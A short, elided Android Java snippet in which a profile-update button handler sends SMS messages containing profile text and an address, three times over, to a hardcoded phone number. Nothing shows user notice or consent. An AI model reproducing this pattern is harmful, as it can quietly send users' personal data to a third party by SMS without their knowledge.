        ...
        profileUpdate.setOnClickListener(new View.OnClickListener() {
            ...
            public void onClick(View view) {
                ...
                try {
                    ...
                    smsManager.sendTextMessage("7028991096", null, sms, null, null);

                    SmsManager smsManager1 = SmsManager.getDefault();
                    smsManager1.sendTextMessage("7028991096", null, sms, null, null);

                    SmsManager smsManager2 = SmsManager.getDefault();
                    smsManager2.sendTextMessage("7028991096", null, address, null, null);
